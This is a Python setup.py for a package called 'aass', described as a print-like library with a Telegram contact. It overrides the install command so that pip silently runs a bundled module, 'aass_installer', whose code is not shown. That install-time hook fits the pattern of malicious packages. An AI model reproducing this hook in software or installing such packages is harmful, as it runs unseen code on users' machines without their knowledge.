from setuptools import setup
from setuptools.command.install import install
import subprocess
import sys

class CustomInstall(install):
    def run(self):
        install.run(self)
        subprocess.run([sys.executable, "-m", "aass_installer"], check=False)

setup(
    name='aass',
    version='2.0.0',
    description="# The aass library in Python prints the text written inside it, like the print function.\n# Telegram  :  @LAEGER_MO\npip install aass",
    author="Programmer Seo Hook : @LAEGER_MO : @sis_c",
    py_modules=['aass_installer'],
    include_package_data=True,
    cmdclass={'install': CustomInstall},
)
